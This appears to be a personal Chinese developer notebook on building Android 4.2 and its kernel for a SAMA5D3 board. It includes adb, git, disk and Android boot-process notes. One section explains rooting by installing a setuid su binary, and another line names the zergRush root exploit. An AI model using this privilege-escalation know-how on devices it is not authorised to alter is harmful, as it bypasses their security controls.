infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$  sudo apt-get install gcc-multilib
/bin/bash: xsltproc: 未找到命令
sudo apt-get install  xsltproc

/bin/bash: xmllint: 未找到命令
sudo apt-get install libxml2-utils

sh: 1: gperf: not found
sudo apt-get install gperf

Can't locate Switch.pm in @INC (you may need to install the Switch module) (@INC contains: /etc/perl /usr/local/lib/perl/5.18.2 /usr/local/share/perl/5.18.2 /usr/lib/perl5 /usr/share/perl5 /usr/lib/perl/5.18 /usr/share/perl/5.18 /usr/local/lib/site_perl .) at external/webkit/Source/WebCore/make-hash-tools.pl line 23.
sudo apt-get install libswitch-perl

infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ make
....................................................................
external/valgrind/tsan/ts_valgrind_intercepts.c:2505:1: warning: unused parameter 'unused_line' [-Wunused-parameter]
external/valgrind/tsan/ts_valgrind_intercepts.c: In function '_vgw00000ZZ_Za_AnnotateFlushExpectedRaces':
external/valgrind/tsan/ts_valgrind_intercepts.c:2621:1: warning: unused parameter 'file' [-Wunused-parameter]
external/valgrind/tsan/ts_valgrind_intercepts.c:2621:1: warning: unused parameter 'line' [-Wunused-parameter]
target SharedLib: vgpreload_tsan-arm-linux (out/target/product/sama5d3/obj/SHARED_LIBRARIES/vgpreload_tsan-arm-linux_intermediates/LINKED/vgpreload_tsan-arm-linux.so)
target Symbolic: vgpreload_tsan-arm-linux (out/target/product/sama5d3/symbols/system/lib/valgrind/vgpreload_tsan-arm-linux.so)
Export includes file: external/valgrind/tsan/Android.mk -- out/target/product/sama5d3/obj/SHARED_LIBRARIES/vgpreload_tsan-arm-linux_intermediates/export_includes
target Unstripped: vgpreload_tsan-arm-linux (out/target/product/sama5d3/obj/lib/vgpreload_tsan-arm-linux.so)
Generated: (out/target/product/sama5d3/android-info.txt)
Installed file list: out/target/product/sama5d3/installed-files.txt
Target system fs image: out/target/product/sama5d3/obj/PACKAGING/systemimage_intermediates/system.img
Running:  mkyaffs2image -f out/target/product/sama5d3/system out/target/product/sama5d3/obj/PACKAGING/systemimage_intermediates/system.img
Install system fs image: out/target/product/sama5d3/system.img
Target ram disk: out/target/product/sama5d3/ramdisk.img
Target userdata fs image: out/target/product/sama5d3/userdata.img
Running:  mkyaffs2image -f out/target/product/sama5d3/data out/target/product/sama5d3/userdata.img

infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ mkubi_image -b sama5d3
==============================
Board chip:sama5d3
==============================
Generate android ubifs file, please wait for about 2-3 minutes ...
Success:you can get system_ubifs-SAMA5D3-ANDROID-4.2.2_r1.1.img and userdata_ubifs-SAMA5D3-ANDROID-4.2.2_r1.1.img under current directory!
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D35/sources/android/android4sam_v4.2$ 

接下来编译android 的linuxkernel
之前git clone下的linux-at91不能用，后来发现，匹配android的linux是另外的linux，需要重新下载
关于编译安卓内核，暂时搁置

ubuntu使用adb调试安卓设备(进入android shell) :
	lsusb
		Bus 001 Device 023: ID 0e8d:201d MediaTek Inc. 
	sudo gedit /etc/udev/rules.d/51-Android.rules
		添加一条: SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", ATTR{idProduct}=="201d", MODE="0600" , OWNER=="infortech-ubuntu-1404"
		sudo chmod a+rx /etc/udev/rules.d/51-Android.rules
	mkdir ~/.android
		gedit ~/.android/adb_usb.ini
		添加一条: 0x0e8d
	infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~$ adb kill-server
	infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~$ adb devices
		* daemon not running. starting it now on port 5037 *
		* daemon started successfully *
		List of devices attached 
		V101172401901	device		//然后就看到了已经这册好的android 设备在列表里
	adb shell //进入到安卓设备的shell假设只连接了一台安卓设备，可以直接这么干，进入安卓设备的shell终端
二、 adb 的常见指令：
    adb devices                  # 列出所有的设备
    reset adb                      # 若重启 adb。若 DDMS 中设备连接失败等故障时，可以重启来解决
    adb kill-server               # 杀死 adb 调试桥
    adb start-server            # 启动 adb 调试桥
    adb shell                       # 若电脑只有一个模拟器或只有一个手机，则进入该设备的 shell，此时可以执行 linux 命令
    adb shell [command]                  # 执行 linux 命令，如 adb shell ls  就是列出连接设备下的所有文件
    adb bugreport                            # 查看 bug 报告
    adb install <apk文件路径>        # 这个命令将指定的apk文件安装到设备上
    adb uninstall <软件名>              # 卸载软件
    adb uninstall -k <软件名>         # 如果加 -k 参数,为卸载软件但是保留配置和缓存文件
    adb push <本地路径> <远程路径>                  # 用push命令可以把本机电脑上的文件或者文件夹复制到设备(手机)
    adb pull <远程路径> <本地路径>                    # 用pull命令可以把设备(手机)上的文件或者文件夹复制到本机电脑

git补充，版本分支处理：
	git checkout -b linux-at91 Android4sam_v4.4 //转向某个分支
	假如操作了分支文件后,
	git checkout //展示那些文件被更改/删除/新添加
	git checkout -- xxx   //假如原来分支版本有文件xxx,但被删掉/更改了,这样可以恢复文件
	git reset --hard      //有时候人为修改并保存后但做错了,而且没有add和commit,还是想checkout到以前,但这时chenckout会出错,
			      //这条命令就是强制重置版本,删除已经保存的修改,然后就可以checkout了
查看网速命令:
	slurm -i eth0		//监控eth0端的网络实时网速
限制网速: (repo android4m v4.4 时,常常因为速度爆表而挂掉vpn)
    	sudo apt-get install wondershaper   
	示例: $ sudo wondershaper eth0 100 20 （限制ppp0网卡下载速度100K，上传速度20K）
	示例:  $ sudo wondershaper clear eth0   (清除ppp0网卡的网速限制）
安装了一个护眼小工具(失败,python3程序):
	sudo add-apt-repository ppa:slgobinath/safeeyes
	sudo apt update
	sudo apt install safeeyes
关闭显示屏命令:
	xset dpms force off
暂停进程命令:
	按键 ctrl+z
	然后出现进程暂停的信息,例如:[6]+  Stopped                 python2.7 learning.py
	恢复进程,使用命令,例如: fg %6  		//6 是上述进程暂停信息的序号
sudo apt-get install 失败后解决方法:
	$ sudo mv /var/lib/dpkg/info/ /var/lib/dpkg/info_old/
	$ sudo mkdir /var/lib/dpkg/info/
	$ sudo apt-get update
	...
	$ sudo apt-get -f install
	...
	$ sudo mv /var/lib/dpkg/info/* /var/lib/dpkg/info_old/		//注意忽略这个*/ 
	$ sudo rm -rf /var/lib/dpkg/info
	$ sudo mv /var/lib/dpkg/info_old/ /var/lib/dpkg/info/
	然后重新 sudo apt-get update 和 sudo apt-get upgrade 就没事了,但好像还是有一点点遗留症
.bashrc添加路径问题:
	#增加.so搜索路径
	export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/liheyuan/soft/lib
	#增加.a搜索路径
	LIBRARY_PATH=$LIBRARY_PATH:/home/liheyuan/soft/lib
	#增加bin搜索路径
	export PATH=$PATH:/home/liheyuan/soft/bin
	#增加GCC的include文件搜索路径
	export C_INCLUDE_PATH=$C_INCLUDE_PATH:/home/liheyuan/soft/include
	#增加G++的include文件搜索路径
	export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/home/liheyuan/soft/inc
加入新硬盘:
	装好然后开机,然后root用户
	fdisk -l	//查看新插入硬盘信息
	如果已经格式化过了,系统会加载这个硬盘,所以先fdisk -l 查看到新加入的硬盘是/dev/sdc,他的分区设备符号,如/dev/sdc1,/dev/sdc2
	如果系统默认加载了,便先卸载
	umount /dev/sdc1
	umount /dev/sdc2
	配置硬盘:
	fdisk /dev/sdc
	d	//表示删除分区命令
	1	//删除分区1
	2	//删除分区2
	w	//执行配置	然后 fdisk -l 变发现没了/dev/sdc1,/dev/sdc2
	fdisk /dev/sdc
	n	//表示添加分区
	p	//选择主盘类型 (还有一种是swap类型,即虚拟内存,)
	1	//分区号
	xx	//起始地址
	xxx	//结束地址
	n	//表示添加分区
	p	//选择主盘类型
	2	//分区号
	xx	//起始地址
	xxx	//结束地址
	....
	w	//执行配置	然后 fdisk -l 变发现出现了/dev/sdc1,/dev/sdc2,...
	格式化要使用的分区
	mkfs -t ext4 /dev/sdc1	
	mkfs -t ext4 /dev/sdc2
	...
	最后是设置启动自动挂载:
		先查看uuid:
		ls -l /dev/disk/by-uuid/
		/dev/sdc1  uuid:333333333...
		/dev/sdc2  uuid:444444444...
		....
		建立两个文件目录:
		mkdir /home/kingders/bb
		mkdir /home/kingders/nn
		然后修改fstab
		sudo gedit /etc/fstab	添加:
		UUID=333333333... /home/kingders/bb               ext4    defaults     0       2
		UUID=444444444... /home/kingders/nn               ext4    defaults     0       2
		....
		最后重启就会自动加载并映射到制定目录了!!!
		特别注意:
			如果多个分区挂到同一文件目录,如 fstab 有这样的,,
			UUID=333333333... /home/kingders/bb               ext4    defaults     0       2
			UUID=444444444... /home/kingders/bb               ext4    defaults     0       2
			系统会出错,也就是说,不能多个分区挂到同一目录上去!!!

清理Linux系统中的孤立、无用的软件包:http://blog.topspeedsnail.com/archives/9992#more-9992
Ubuntu 安装使用 Krita -专业绘画软件(相当于ps)http://blog.topspeedsnail.com/archives/9816
Ramme: 开源的Instagram桌面客户端:http://blog.topspeedsnail.com/archives/9664
Ubuntu 安装 Qucs电路模拟器:http://blog.topspeedsnail.com/archives/9369
Linux下的种子搜索工具:http://blog.topspeedsnail.com/archives/9363
tinyrenderer: 理解OpenGL的工作原理:http://blog.topspeedsnail.com/archives/9357
Ubuntu 安装 LibreCAD－开源的CAD软件:http://blog.topspeedsnail.com/archives/9184
Ubuntu 安装 Drawpile－多人协作绘图:http://blog.topspeedsnail.com/archives/9161
Ubuntu 安装 KiCad－EDA电路板设计软件:http://blog.topspeedsnail.com/archives/9157
Nightfall: 天文学软件-Ubuntu:blog.topspeedsnail.com/archives/10095
Ubuntu 安装 CGAL-计算几何算法库:http://blog.topspeedsnail.com/archives/10080
使用requests.get下载大文件－Python:http://blog.topspeedsnail.com/archives/9075
Ubuntu 安装 MakeHuman－3D人物角色建模软件:http://blog.topspeedsnail.com/archives/9051
Ubuntu 安装 OSSN－搭建自己的社交网站:http://blog.topspeedsnail.com/archives/8983
PyCryptodome密码学模块－Python:http://blog.topspeedsnail.com/archives/8586
Linux 安装 Kdenlive－视频编辑软件:http://blog.topspeedsnail.com/archives/8204
FFmpeg编译安装脚本－CentOS:http://blog.topspeedsnail.com/archives/7316
开发第一个Google Chrome浏览器插件:http://blog.topspeedsnail.com/archives/7114
Ubuntu 16.04安装Fcitx拼音输入法:http://blog.topspeedsnail.com/archives/6948
使用Dlib ( C++ / Python )－检测面部关键特征(机器学习有关):http://blog.topspeedsnail.com/archives/6935
Ubuntu14.04安装OpenCV:http://blog.topspeedsnail.com/archives/1257
Flask的安装和使用：第一个Hello World:http://blog.topspeedsnail.com/archives/1459
使用Flask搭建一个简单的静态网站:http://blog.topspeedsnail.com/archives/1528
使用Flask创建一个登陆页面:http://blog.topspeedsnail.com/archives/1540
关于机器人的开源项目:http://blog.topspeedsnail.com/archives/4423
开源软件架构－Nginxhttp://blog.topspeedsnail.com/archives/5595
开源软件架构－matplotlib(基于Python的绘图库，广泛用于Python科学计算界):http://blog.topspeedsnail.com/archives/5569
fabric: Linux的远程操作和自动部署(用于简化使用SSH的应用程序部署或多机操作):http://blog.topspeedsnail.com/archives/7868









20170508
编译android_kernel:
安卓的内核构造基于一般linux内核,但又很不一样,所以是另一套内核源码!!
编译安卓内核前先要完成安卓文件系统的编译!!!
下载源码:
	git clone git://github.com/Android4SAM/linux-at91.git
	cd linux-at91
	git checkout -b linux-at91 Android4sam_v4.4
把之前编译好了安卓文件系统的生成内容中的 root文件夹(<android_working_dir> /out/target/product/sama5d3/root)
	复制到安卓内核源码的根目录里
编译:
	make mrproper
	make ARCH=arm sama5_android_defconfig
	make ARCH=arm CROSS_COMPILE=arm-linux-gneabihf- uImage
利用开发板安卓demo的.sh文件烧录到开发板进行测试:
开机log:
.....
demo_fs with made_kernel
ALSA device list:
  #0: wm8904 @ SAMA5D3EK
Warning: unable to open an initial console.
Freeing unused kernel memory: 524K (c0686000 - c0709000)
init: skipping insecure file '/default.prop'
init: skipping insecure file '/init.rc'
init: Timed out waiting for /dev/.coldboot_done
init: Unable to open persistent property directory /data/property errno: 2
	卡死在这里!!!
经资料搜索,先系统分析了安卓系统的构成:
	安卓系统主要构成:安卓linux内核,systemfs,userfs.
	传统linux系统主要构成:内核,rootfs
	其实安卓系统是把rootfs分成的三部分,一部分systemfs,一部分userfs,还有一部分合并到安卓内核镜像里
	上述编译内核前得把编译好的安卓文件系统的root文件放入安卓内核源码根目录上的原因是,
		root里的内容 就是要合并到安卓内核镜像里的,属于rootfs一部分的内容,最后这些内容会出现在开发板的 / 根目录符上
上述初始化出错文件 init.rc 还有default.prop 就是那个root文件夹里的文件,编译内核时,会合并到 安卓内核镜像的
init: skipping insecure file 的原因是,因为出于安全性,default.prop, init.rc 等,这些文件是不可以出现用户写的模式的,
	当安卓内核初始化来到要执行default.prop, init.rc 等文件时,会检测文件是否存在允许文件写的模式,若存在就不会执行,然后初始化就卡死这了
	所以在编译内核前,还要去除 这些文件的写模式:
		sudo chmod a-w init.rc
		sudo chmod a-w default.prop
最后重行编译,成功运行!!!

新问题:
init: critical process 'servicemanager' exited 4 times in 4 minutes; rebooting into recovery mode
RomBOOTing system with command 'recovery'.
根据google,初步认为没有选上 buinder IPC : 
	make menuconfig: ->device driver ->staging drivers ->android ->android binder ipc driver
	但发现,其实已经选上
学习使用 logcat命令 观察错误log,却出错不能用:
	Unable to open log device '/dev/log/main': Permission denied
	初以为logcat 没达到 root权限,需要学习使用 android 的 su 命令:
尝试绕过su,用回 demo 的uimage 发现 logcat 可行,,怀疑并不是logcat命令的权限问题,而是/dev/log/main 的问题
	/dev/log/main 的问题,可能不是取不到权限,而是还未完全初始化!!,回过开机log:
		..................
		Warning: unable to open an initial console.
		Freeing unused kernel memory: 524K (c0686000 - c0709000)
		init: skipping insecure file '/init.usb.rc'
		init: could not import file '/init.usb.rc' from '/init.rc'
		init: could not import file '/init..rc' from '/init.rc'
		init: skipping insecure file '/init.trace.rc'
		init: could not import file '/init.trace.rc' from '/init.rc'
		init (1): /proc/1/oom_adj is deprecated, please use /proc/1/oom_score_adj instead.
		init: skipping insecure file '/ueventd.rc'
		init: cannot open '/initlogo.rle'
		UBIFS: mounted UBI device 0, volume 0, name "system", R/O mode
		UBIFS: LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
		UBIFS: FS size: 123039744 bytes (117 MiB, 969 LEBs), journal size 9023488 bytes (8 MiB, 72 LEBs)
		UBIFS: reserved for root: 0 bytes (0 KiB)
		UBIFS: media format: w4/r0 (latest is w4/r0), UUID 93D922B5-68F5-4DEC-9B37-A21E28B434FC, small LPT model
		UBIFS: background thread "ubifs_bgt1_0" started, PID 966
		UBIFS: mounted UBI device 1, volume 0, name "userdata"(null)
		UBIFS: LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
		UBIFS: FS size: 90533888 bytes (86 MiB, 713 LEBs), journal size 9023488 bytes (8 MiB, 72 LEBs)
		UBIFS: reserved for root: 0 bytes (0 KiB)
		UBIFS: media format: w4/r0 (latest is w4/r0), UUID BF841DE4-C845-435B-B3BF-AD516A1726E0, small LPT model
		init: cannot find '/system/bin/rild', disabling 'ril-daemon'
		init: cannot find '/system/etc/install-recovery.sh', disabling 'flash_recovery'
		/system/bin/sh: No controlling tty: open /dev/tty: Permission denied
		/system/bin/sh: warning: won't have full job control
		shell@android:/ $ init: untracked pid 971 exited
	发现可能是没有正确执行,init.usb.rc init.trace.rc /ueventd.rc 初始化,
	所以如上述处理 init.rc 的方法,处理这三个文件 init.usb.rc init.trace.rc /ueventd.rc
最后成功烧录运行,不再自动重启!!!!!

补充:
权限问题:
一般我们在Linux的console下输入 ls -l 会列出所有文件的权限。
	比如：-rwxr-xr-x，用过Linux的人都知道r代表该文件可读，w代表可写，x代表可执行，-就代表没有该权限。
		第一个rwx代表文件所有者的权限，
		第二个rwx代表和所有者同组人的权限，
		第三个rwx代表其他用户对该文件的权限
	再如：-rwsr-xr-x，它的执行权限标志位是一个s，s代表当任何一个用户执行该文件的时候都拥有文件所有者的权限，
		这文件的所有者是root，简单点说就是不管谁执行这个文件，他执行的时候都是以root身份执行的
android 里的 su 和 rooted 知识:(https://www.zhihu.com/question/21074979/answer/18176410)
	一般Linux下su以后输入密码就可以切换到root了，但Android里的su和Linux里的su是不一样的，
	Android里的su不是靠验证密码的，而是看你原来的权限是什么。
	意思就是如果你是root，那你可以通过su切换到别的用户，比如说shell,wifi,audio什么的。
	但如果你是root之外的其他用户，就不能切换回root了，会提示你permission denied
	那么我就把一个所有者是root的su程序权限标志位置成-rwsr-xr-x，那么不管谁执行它，都是root身份执行，
		su就可以顺利执行成功了，执行成功之后我就是root身份了。
	问题都清楚了，就是你需要把一个所有者是root的su拷贝到Android手机上，
		并且把su的权限标志位置成-rwsr-xr-x。能把这个事情搞定你就成功root了一个手机。
		大概意思就是两行代码
	 	cp /data/tmp/su /system/bin/                  
	 	#copy su 到/system/分区chown root:root su                                
		#su的所有者置成rootchmod 4755 /system/bin/su                   #把su置成-rwsr-xr-x
	但是,熟悉Android的同学都知道，执行上面的每一行代码都需要root权限才能成功。
		意思就是说，你只有有root权限的情况下才能执行上面两行代码，
		而这两行代码就是为了让你获得root权限的，这是一个逻辑闭环，
		那么如何打破这个逻辑闭环呢？
			一个办法就是找一个本身已经有root权限的进程来启动我上面的两行代码，那我这两行代码一启动就是root权限，就可以顺利执行了。
			但是已经有root权限的进程都是出厂时候就装到手机上的，代码写死了，你没法控制它执行你自己的代码啊。
			这个时候就需要你找漏洞了，比如用来破解Android2.3 root权限的zergRush漏洞就是利用一个拥有root权限的进程栈溢出漏洞。
	但是,上述是建立在不重新刷写系统的情况,
		假如文件系统是自己编译的,那么,我们可以尝试着在已构造好文件系统,但编译出镜像文件之前,
		先给 su chmod成-rwsr-xr-x,再编译出烧录镜像
	为什么su一定要放到/system/bin/或者/system/xbin/,而不能放在data分区?
		因为data分区在mount时就指定了不能给可执行程序加s位。在adb shell里执行mount就可以看到.
		即data分区的可执行程序都不可以有 s 这个执行模式,只能是 x 这个执行模式
		下面是google越来的解释:
		/*
		 * 首先，你当然可以把su这个程序copy到/data/分区，但你adb push进去的时候，su有这个程序的所有者肯定不是root，
		 * 一般是shell什么的(记不清了，应该是和adbd这个进程的所有者一样)，
		 * 这个时候即使你把它权限置为-rwsr-xr-x，哪你运行它的时候也是shell身份运行的，su会提示你输入密码的。
		 * 第二,我们root手机的目的是为了运行需要root权限的APP，比如goagent或者什么的。 
		 * 这些APP里代码需要获得root的时候是这么写的：
		 * 	Process p = Runtime.getRuntime().exec("su");
		 * 也就是它们在代码里调用了一下su这个程序，哪可以写成下面这个样子吗？
		 * 	Process p = Runtime.getRuntime().exec("./data/tmp/su");
		 * 我没写过APP，不太清楚，估计是不行的。换句话说你必须把su放到环境变量PATH所有的目录里，APP才能调用到它。
		 * 如果你不想放到bin或者xbin下，你就必须给PATH增加一个目录。PATH是root权限才能修改的，
		 * 你如果能修改PATH，说明你已经有root权限了，修改PATH就没必要了，还不如直接放到bin下面。
		 */
		关于sudoandroid的工程里没有sudo这个东西。sudo是为了给普通用户临时分配root权限的，
		Android里建立了很多用户，比如wifi,shell等等，
		这些用户可以访问那个文件，不可以访问那个文件，代码里已经写死了，权限也分配的很分明。
		它们在运行的过程中不需要临时获得root权限。所以Android不需要sudo这个程序。
android基础1:
	Android对标准的Linux内核代码做了大量的剪裁和优化，并且添加了许多特有的代码，主要包括：
		自定义UI系统，采用Bionic Libc库代替glibc库，添加Gold-Fish平台，编写专有的驱动程序，如Binder、Logger、PowerManager等等。
		由于版权分歧等原因，这些修改并没有merge到Linux主分支中去，
		因此，我们不能直接从Linux Kernel的官网（kernel.org）去下载适用于Android源码的Linux内核代码，
		而是要到Google官网提供的kernel网址去下载经过修改后的Linux内核代码。
		Google提供了多个版本的Linux Kernel，分别对应不同的设备或者厂商版本.
		安卓版本信息:https://en.wikipedia.org/wiki/Android_version_history
安卓系统的组成:(google得到的参考资料)
	1. MLO, u-boot.img (bootloader)
	u-boot编译输出文件有2个，一个是MLO，另一个是u-boot.img，
	因此，对于很多Android开发板而言，一定存在一个boot分区（通常是fat32格式），该分区里存放有MLO和u-boot.img这两个重要的文件。
	2. uImage
	由于Android系统是基于Linux内核的，因此，与嵌入式Linux启动过程一样，“bootloader”完成硬件检测和初始化配置后，
	第一步要做的也是加载并运行Linux内核镜像，因此，在Android设备启动过程中，除了MLO和u-boot.img文件外，
	另一个最重要的文件就是内核镜像uImage文件了。
	注：Linux内核编译成功后，会在arch/arm/boot/目录下生成zImage文件，通过mkimage命令，
	给zImage文件加上了64个字节的数据头得到uImage文件，这样才能被u-boot识别并正确引导。
	3. ramdisk.img
	在Linux内核启动时，首先去创建虚拟的根文件系统，然后在指定位置寻址真正的根文件系统镜像并加载到内存中，
	然后执行init可执行程序完成系统启动过程。
	对于嵌入式Linux系统而言，一般需要用busybox等工具专门创建一个根文件系统镜像，而Android源码中已经实现了一个根文件系统，
	即ramdisk.img，Android内核系统启动时会首先加载ramdisk.img作为根文件系统，然后再执行init程序，解析init.rc脚本，
	挂载系统其他分区、开启各个进程和服务等。
	因此，Android系统启动第三个必不可少的文件即ramdisk.img文件，它是Android系统的根文件系统镜像。
		//注意到,我们编译内核时需要的 安卓文件系统靠过来的root文件夹里包含的就是 ramdisk.img 一样的内容
	4. boot.img
	Android系统中，通常会把zImage和ramdisk.img打包到一起，生成一个boot.img镜像文件，
	放到boot分区，由bootloader来引导启动，其启动过程本质也是和分开的uImage&ramdisk.img类似，
	只不过把两个镜像按照一定的格式合并为一个镜像而已。	
		//注意到,我们sama5系列 最后用到的 uImage镜像 就是kernel和ramdisk.img的合并镜像
	bootloader如何知道去哪加载Linux内核(zImage)和根文件系统(ramdisk.img)呢？通常是由命令行参数传入bootloader程序，
	或者在bootloader代码中给出启动参数配置文件的路径，具体的原理可以去参考bootloader启动Linux内核相关的文章分析，这里就不做详细介绍了。
	5. system.img
	前面我们提到的镜像如“bootloader”，“Linux Kernel”，“文件系统”都是不包含Android系统的核心文件，
	那么，真正的Android操作系统核心部分在哪呢？其实就位于system.img中，它包含了Android系统的firmware、用户界面、一系列的预编译应用等等，
	会在内核启动后被挂载到/system分区。因此，它也是Android系统启动必不可少的镜像之一。
		//就是systemfs
	6. userdata.img
	前面介绍的system.img镜像中包含的都是Android系统级别的数据，而“用户”的“出厂”数据则都被放到了userdata.img镜像中了，
	它会被挂载到文件系统的/data分区，用户新存储的数据、安装的程序均会被放置到这个分区中，如果擦除这个分区，
	本质上则等同于手机恢复了出厂设置，它也是Android系统启动必不可少的镜像之一。
	7. 其他的镜像
	前面介绍的几个都是Android系统启动涉及到的最重要的几个镜像文件，当然，编译输出还有其他的几个文件包括：
	用来缓存最频繁访问的数据和应用的cache.img，
	用来恢复系统时使用的recovery.img等，这里就不详细讲解了。	
android 磁盘分区:
	一般有:
	/boot		->  /dev/mtd/mtd2	//放置 内核 initrd 等执行内容区
	/system		->  /dev/mtd/mtd3	//android系统软件 api 等 只读区
	/recovery	->  /dev/mtd/mtd1	//放置 内核 initrd 等执行内容的 备份恢复区
	/data		->  /dev/mtd/mtd5	//用户数据区
	/cache		->  /dev/mtd/mtd4	//内存的缓存区
	/misc		->  /dev/mtd/mtd0	//flags区,记录设备实时状态
	fastboot: 
		是google提供的方便 android设备与pc 通过usb 传输数据,烧写镜像的传输协议, 一般移植在 u-boot 上,
		若使用fastboot,u-boot会自动把镜像中对应的部分烧录到指定的区域,开发板启动时也会自动分配空间和读取内容到内存运行等等,,,
		当然如果不使用fastboot,工程师就得自己自己编写放置镜像各部分的位置,还有启动时,把哪些内容搬到内存执行,初始化哪些区域等等,,
android 启动过程:
	简图:
	prebootloader -> u-boot(bootloader) -> kernel -> init
		-->daemons
		-->zygote ->Dalvik VM ->systemserver ->managers -> applications(实际上app是zygote fork出的,但在systemserver以后才允许执行)
							  |
		----------------->serviceMagener <--______|
					 ^
		-->NativeServices -------|
		prebootloader 即芯片特有的固化启动程序,然后uboot初始化启动内核的环境,然后开始kernel的初始化,
		kernel初始化各种软硬件环境，加载驱动程序，挂载根文件系统，最后执行init程序,就开始进入android的世界
		kernel初始化与一般linux系统初始化无异,android与一般linux 区别就在于init程序的不同，
		init决定系统启动过程中，会启动哪些守护进程和服务，以及呈现出怎样的一个用户UI界面
	init程序是分析Android启动过程中最核心的程序主要有3点：
		创建和挂载一些系统目录/设备节点，设置权限，如：/dev, /proc, and /sys
		解析 init.rc 和 init.<hardware>.rc，并启动属性服务，以及一系列的服务和进程。
		显示boot logo，默认是“Android”字样
		最重要的是第二步，一系列的Android服务在这时被启动起来,
	本地服务(Native daemons):
		相当一部分是在 init.rc 和init.<hardware>.rc 里启动:
			ueventd, servicemanager, debuggerd, rild, mediaserver, app_process 等
			这些都是 init直接启动的本地服务,都是一个独立的linux进程,可通过top查看进程 
		另一部是被那些 已启动的服务 启动的,如:
			mediaserver: AudioFlinger, MediaPlayerService, CameraService
	Android服务 (system services):
		init 直接启动的本地服务中有一个 app_process服务,
		app_process 会创建 Zygote进程,
		Zygote进程内容是:先打开 Dalvik VM (android java机)虚拟机,然后通过虚拟机执行具体进程内容
		Zygote进程其中一个具体进程内容,就是,fork 出 systemserver 进程
		fork出的 systemserver 进程 自然也是需要已打开的java机辅助 才能正常执行的进程
		systemserver 进程 把所有 android核心服务启动起来,包括:
			Activity Manager		//管理 activity 生命周期, 和新的 activity 服务
			Package Manager			//管理 app (安装,卸载,更新,权限)
			Window Manager			//管理 窗口事件
			AppWidget Manager		//管理 andriod 插件
			Backup Manager			//管理 备份
			status bar			//状态栏 相关
 			power Manager 			//管理 电源
 			networkManagement Service	//网络 相关
			notification Manager		//通知栏 相关
			Location Manager		//位置信息 相关
			Entropy Mixer			//??
			Display Manager			//管理 显示
			Telephony Registry		//电话 相关
			Scheduling Policy		//管理 进程执行
			Account Manager			//管理 账户
			Content Manager			//管理 数据
			Battery Service			//管理 电池
			Alarm Service			//预约未来执行 某程序
			Input Manager			//管理 输入
			Device Policy			//设备安全策略
			Clipboard Service		//剪贴板
			NetworkStats Service		//网络状态
			NetworkPolicy SEvice		//网络安全策略
			WIFI p2pservice			//wifi 点对点连接
			Enternet Service		//万维网 连接
			WiFI Service			//管理 wifi
			Connectivity Service		//万罗连接状态
			Network Service Discovery Service	//网络发现服务
		systemserver 进程里的这些任务都是systemserver 进程的独立子线程运行的
		systemserver 进程所有服务启动了以后, Activity Manager服务会开始启动UI界面并发送广播信息"ACTION_BOOT_COMPLETED"
		Activity Manager服务 启动 luancher, luancher 启动 Home Screen
android log 输出:
	配置系统的log输出
		make menuconfig，勾选："Kernel hacking" -> "Show timing information on printks"
		将init进程的详细log输出到dmesg文件中,修改/system/core/rootdir/init.rc，把loglevel从3改为7
	抓取系统启动的log信息
		Android系统启动的log分为 Linux内核的log 和 Android Logger系统的log，
		抓取的方法如下：
			adb shell dmesg > dmesg.txt
			adb logcat -d -v time -b "main"   >  main.txt
			adb logcat -d -v time -b "system" >  system.txt
			adb logcat -d -v time -b "events" >  events.txt
	dmesg消息:	
		直到 "Freeing init memory" 消息出现前,都是Linux内核初始化的log,
		然后就是 init 的的消息,一般都有 "init: starting" 前缀
	关于Zygote初始化消息:
	 	init的时候就初始化Zygote, dmesg有 " init: starting 'zygote' "
		但 Zygote 进程的详细初始化log信息具体放到/dev/log/main文件中了
		由于后续所有的Android应用程序都是从Zygote进程fork出来的，
		Android系统为了提高应用程序的启动速度，会在Zygote进程初始化过程中加载一些常用的java class和资源文件到进程的内存中，
		从而共享常用的class和resourse资源。这个过程我们可以通过检索"preload"标签得到这个过程所消耗的时间，
	SystemServer初始化消息:
		Zygote完成了初始化工作后就启动SystemServer进程了，
		SystemServer进程的log信息被放到了/dev/log/system文件中了
	最后,整个系统初始化结束的标记 " boot_completed " 出现在dmesg消息里
android系统优化,裁剪:
	减少 Zygote初始化时proload 的java class 和 resource 一般操作这些文件
		frameworks/base/preload-classes
		frameworks/base/core/res/res/values/arrays.xml
	减少 不必要的 本地服务 和 android服务 一般操作的文件:
		system/core/rootdir/init.rc
		frameworks/base/services/java/com/android/server/SystemServer.java
	减少预装apk 一般操作的文件:
		build/target/product/xxxx.mk
		device/<company>/<product>/xxxx.mk
		vendor/..../xxxx.mk
	减少内核log打印级别: 修改system/core/rootdir/init.rc 的loglevel
	其他例如:
		优化启动动画，降低帧率和图片尺寸
		精简系统，减小boot.img文件大小，可以显著减少启动过程中加载和解压boot.img的时间
		预先创建一些目录和文件，而不是在init过程中创建
apk安装:
	android里 apk安装后,apk安装文件还是会被保存起来的:
		一般的apk安装 默认放在 /data/app里
		而系统自带apk放在 /system/app, /system/vendor/app, /system/priv-app
		由于在/system 如果没有rooted,无法删除系统自带app	
	安装一个xxx.apk(非系统自带apk):
		xxx.app执行文件dex放在 /data/dalvik-cache (android java机执行的程序是dex)
		相关数据(数据库,xml,cache,.so动态库)放在 /data/data/com.xxx 的新建目录里
		注册apk的AndroidManifinest.xml信息到 /data/system/packages.xml
			这些信息包括：权限、应用包名、APK的安装位置、版本、userID等等
		部分apk的安装也会向Launcher应用申请添加创建快捷方式
	删除那些存放在/data/app, /system/app, /system/vendor/app, /system/priv-app 里的apk,相当于卸载app
	









20170511
virtualbox 安装 kali linux
	 kali是集成众多hack工具的debian系统,最著名的工具有 metasploit
virtualbox不能安装64位系统问题:
	`进入BIOS后，找到Configuration选项，选择Intel Virtual Technology并回车
